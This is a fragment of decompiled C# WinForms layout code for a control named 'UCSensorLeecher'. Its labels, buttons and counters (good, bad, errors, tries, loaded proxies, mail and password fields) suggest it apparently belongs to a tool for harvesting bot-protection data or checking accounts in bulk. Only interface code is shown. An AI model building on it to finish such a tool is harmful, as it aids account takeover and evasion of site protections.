			this.label12.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
			this.label12.AutoSize = true;
			this.label12.Font = new Font("Nirmala UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label12.ForeColor = Color.White;
			this.label12.Location = new Point(5, 11);
			this.label12.Margin = new Padding(2, 0, 2, 0);
			this.label12.Name = "label12";
			this.label12.Padding = new Padding(0, 0, 4, 4);
			this.label12.Size = new Size(29, 19);
			this.label12.TabIndex = 326;
			this.label12.Text = "Uri:";
			this.groupBox3.Controls.Add(this.bad_lbl);
			this.groupBox3.Controls.Add(this.label2);
			this.groupBox3.Controls.Add(this.label8);
			this.groupBox3.Controls.Add(this.All_lbl);
			this.groupBox3.Controls.Add(this.label9);
			this.groupBox3.Controls.Add(this.label3);
			this.groupBox3.Controls.Add(this.good_lbl);
			this.groupBox3.Controls.Add(this.LoadedPx_lbl);
			this.groupBox3.Controls.Add(this.errors_lbl);
			this.groupBox3.Controls.Add(this.tries_lbl);
			this.groupBox3.Controls.Add(this.label4);
			this.groupBox3.Controls.Add(this.label5);
			this.groupBox3.ForeColor = Color.White;
			this.groupBox3.Location = new Point(353, 201);
			this.groupBox3.Name = "groupBox3";
			this.groupBox3.Size = new Size(253, 85);
			this.groupBox3.TabIndex = 328;
			this.groupBox3.TabStop = false;
			this.groupBox3.Text = "Status";
			this.groupBox1.Controls.Add(this.Start_btn);
			this.groupBox1.Controls.Add(this.CMExecutor_btn);
			this.groupBox1.Controls.Add(this.Stop_btn);
			this.groupBox1.Controls.Add(this.Clear_btn);
			this.groupBox1.Controls.Add(this.Save_btn);
			this.groupBox1.Controls.Add(this.Load_btn);
			this.groupBox1.ForeColor = Color.White;
			this.groupBox1.Location = new Point(356, 6);
			this.groupBox1.Name = "groupBox1";
			this.groupBox1.Size = new Size(250, 117);
			this.groupBox1.TabIndex = 329;
			this.groupBox1.TabStop = false;
			this.groupBox1.Text = "Status";
			this.groupBox1.Enter += this.groupBox1_Enter;
			this.label1.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
			this.label1.AutoSize = true;
			this.label1.Font = new Font("Nirmala UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.label1.ForeColor = Color.White;
			this.label1.Location = new Point(353, 176);
			this.label1.Margin = new Padding(2, 0, 2, 0);
			this.label1.Name = "label1";
			this.label1.Padding = new Padding(0, 0, 4, 4);
			this.label1.Size = new Size(79, 19);
			this.label1.TabIndex = 320;
			this.label1.Text = "Leech Mode:";
			this.browser_bw.Location = new Point(3, 9);
			this.browser_bw.MinimumSize = new Size(20, 20);
			this.browser_bw.Name = "browser_bw";
			this.browser_bw.ScriptErrorsSuppressed = true;
			this.browser_bw.Size = new Size(560, 307);
			this.browser_bw.TabIndex = 328;
			this.browser_bw.DocumentCompleted += this.Browser_bw_DocumentCompleted;
			this.pictureBox1.Image = Resources.original;
			this.pictureBox1.Location = new Point(6, 292);
			this.pictureBox1.Name = "pictureBox1";
			this.pictureBox1.Size = new Size(573, 179);
			this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
			this.pictureBox1.TabIndex = 330;
			this.pictureBox1.TabStop = false;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.FromArgb(0, 0, 64);
			base.Controls.Add(this.tabControl1);
			base.Name = "UCSensorLeecher";
			base.Size = new Size(619, 503);
			this.tabControl1.ResumeLayout(false);
			this.SensorManager_tb.ResumeLayout(false);
			this.SensorManager_tb.PerformLayout();
			((ISupportInitialize)this.SensorsGrid).EndInit();
			this.LeechSettings_tp.ResumeLayout(false);
			this.LeechSettings_tp.PerformLayout();
			this.groupBox2.ResumeLayout(false);
			this.groupBox3.ResumeLayout(false);
			this.groupBox3.PerformLayout();
			this.groupBox1.ResumeLayout(false);
			((ISupportInitialize)this.pictureBox1).EndInit();
			base.ResumeLayout(false);
		}

		// Token: 0x060001BF RID: 447 RVA: 0x00002050 File Offset: 0x00000250
		private void Mail_ID_tb_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060001C0 RID: 448 RVA: 0x00002050 File Offset: 0x00000250
		private void groupBox1_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x060001C1 RID: 449 RVA: 0x00002050 File Offset: 0x00000250
		private void LeechMode_cb_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060001C2 RID: 450 RVA: 0x00002050 File Offset: 0x00000250
		private void LeechSettings_tp_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x040001AF RID: 431
		private bool isSerialized = false;

		// Token: 0x040001B0 RID: 432
		private int allTries;

		// Token: 0x040001B1 RID: 433
		private int errors;

		// Token: 0x040001B2 RID: 434
		private int goods;

		// Token: 0x040001B3 RID: 435
		private int bads;

		// Token: 0x040001B4 RID: 436
		private static Random random = new Random();

		// Token: 0x040001B5 RID: 437
		private IContainer components = null;

		// Token: 0x040001B6 RID: 438
		private TabControl tabControl1;

		// Token: 0x040001B7 RID: 439
		private TabPage SensorManager_tb;

		// Token: 0x040001B8 RID: 440
		private TabPage LeechSettings_tp;

		// Token: 0x040001B9 RID: 441
		private Button CMExecutor_btn;

		// Token: 0x040001BA RID: 442
		private Button Load_btn;

		// Token: 0x040001BB RID: 443
		private Button Save_btn;

		// Token: 0x040001BC RID: 444
		private Button Stop_btn;

		// Token: 0x040001BD RID: 445
		private Button Start_btn;

		// Token: 0x040001BE RID: 446
		public Label bad_lbl;

		// Token: 0x040001BF RID: 447
		private Label label8;

		// Token: 0x040001C0 RID: 448
		private Label label9;

		// Token: 0x040001C1 RID: 449
		public Label good_lbl;

		// Token: 0x040001C2 RID: 450
		public Label errors_lbl;

		// Token: 0x040001C3 RID: 451
		private Label label4;

		// Token: 0x040001C4 RID: 452
		private Label label5;

		// Token: 0x040001C5 RID: 453
		public Label tries_lbl;

		// Token: 0x040001C6 RID: 454
		public Label LoadedPx_lbl;

		// Token: 0x040001C7 RID: 455
		private Label label3;

		// Token: 0x040001C8 RID: 456
		private Label label2;

		// Token: 0x040001C9 RID: 457
		public Label All_lbl;

		// Token: 0x040001CA RID: 458
		private Button Clear_btn;

		// Token: 0x040001CB RID: 459
		private Label label11;

		// Token: 0x040001CC RID: 460
		public TextBox Command_tb;

		// Token: 0x040001CD RID: 461
		private Label label12;

		// Token: 0x040001CE RID: 462
		public ComboBox uri_cb;

		// Token: 0x040001CF RID: 463
		public TextBox uri_tb;

		// Token: 0x040001D0 RID: 464
		private Button Add_btn;

		// Token: 0x040001D1 RID: 465
		public TextBox Pass_ID_tb;

		// Token: 0x040001D2 RID: 466
		private Label label21;

		// Token: 0x040001D3 RID: 467
		public TextBox Mail_ID_tb;

		// Token: 0x040001D4 RID: 468
		private Label label14;

		// Token: 0x040001D5 RID: 469
		private Button GetPass_btn;

		// Token: 0x040001D6 RID: 470
		private Button GetMail_btn;

		// Token: 0x040001D7 RID: 471
		private Button Find_btn;

		// Token: 0x040001D8 RID: 472
		public TextBox ID_tb;

		// Token: 0x040001D9 RID: 473
		public TextBox Submit_tb;

		// Token: 0x040001DA RID: 474
		private Label label13;

		// Token: 0x040001DB RID: 475
		private GroupBox groupBox2;

		// Token: 0x040001DC RID: 476
		private Button GetSubmit_btn;

		// Token: 0x040001DD RID: 477
		public WebBrowser browser_bw;

		// Token: 0x040001DE RID: 478
		public DataGridView SensorsGrid;

		// Token: 0x040001DF RID: 479
		private GroupBox groupBox3;

		// Token: 0x040001E0 RID: 480
		private Label label1;

		// Token: 0x040001E1 RID: 481
		private GroupBox groupBox1;

		// Token: 0x040001E2 RID: 482
		private PictureBox pictureBox1;

		// Token: 0x040001E3 RID: 483
		private ComboBox LeechMode_cb;
	}
}
